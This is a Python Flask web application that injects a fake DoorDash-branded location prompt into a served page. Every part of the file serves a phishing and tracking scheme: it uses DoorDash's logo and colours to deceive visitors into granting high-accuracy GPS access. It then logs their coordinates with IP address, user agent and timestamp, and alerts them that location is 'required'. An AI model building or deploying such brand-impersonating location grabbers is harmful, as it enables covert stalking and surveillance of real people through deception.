from flask import Flask, request, send_from_directory, jsonify
import logging
from datetime import datetime
import os

app = Flask(__name__)

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def inject_gps_code(html_content):
    """Inject the GPS permission overlay and JavaScript into existing HTML"""
    injection = """
    <!-- Injected GPS Permission Code -->
    <style>
        #gps-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.8);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            color: white;
            z-index: 1000;
            text-align: center;
            padding: 20px;
            box-sizing: border-box;
        }
        #gps-content {
            max-width: 400px;
            background-color: white;
            color: black;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        }
        #allow-btn {
            background-color: #FF3008;
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 20px;
            font-weight: bold;
        }
        #allow-btn:hover {
            background-color: #e62a00;
        }
        .gps-logo {
            width: 100px;
            margin-bottom: 20px;
        }
    </style>
    <div id="gps-overlay">
        <div id="gps-content">
            <img src="https://cdn.doordash.com/managed/consumer/seo/doordash_seo_desktop.png" alt="Doordash Logo" class="gps-logo">
            <h2>Doordash needs your location to find restaurants near you</h2>
            <p>To provide the best experience, we need access to your location to show nearby restaurants.</p>
            <button id="allow-btn">Allow Location Access</button>
        </div>
    </div>
    <script>
        document.getElementById('allow-btn').addEventListener('click', function() {
            // Notify server permission was requested
            fetch('/request_permission', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'}
            }).then(() => {
                // Request actual GPS permission
                if ("geolocation" in navigator) {
                    navigator.geolocation.getCurrentPosition(
                        function(position) {
                            // Send location to server
                            fetch('/log_location', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({
                                    latitude: position.coords.latitude,
                                    longitude: position.coords.longitude,
                                    accuracy: position.coords.accuracy
                                })
                            }).then(() => {
                                // Hide overlay after successful logging
                                document.getElementById('gps-overlay').style.display = 'none';
                            });
                        },
                        function(error) {
                            console.error("Location error:", error);
                            alert("Location access is required for this service.");
                        },
                        {enableHighAccuracy: true, timeout: 10000}
                    );
                } else {
                    alert("Geolocation not supported by your browser.");
                }
            });
        });
    </script>
    <!-- End Injected Code -->
    </body>
    """
    
    # Insert our code just before the closing </body> tag
    return html_content.replace('</body>', injection)

@app.route('/')
def serve_page():
    # Get client IP
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    logger.info(f"Page accessed - IP: {client_ip}, UA: {user_agent}, Time: {datetime.utcnow()}")
    
    # Read and inject into the existing page.html
    with open('templates/page.html', 'r') as f:
        html_content = f.read()
    
    injected_html = inject_gps_code(html_content)
    return injected_html

@app.route('/request_permission', methods=['POST'])
def handle_permission_request():
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    logger.info(f"Permission requested - IP: {client_ip}, Time: {datetime.utcnow()}")
    return jsonify({'status': 'success'})

@app.route('/log_location', methods=['POST'])
def handle_location():
    data = request.json
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    logger.info(f"Location received - IP: {client_ip}, Lat: {data.get('latitude')}, Lon: {data.get('longitude')}, Time: {datetime.utcnow()}")
    return jsonify({'status': 'success'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
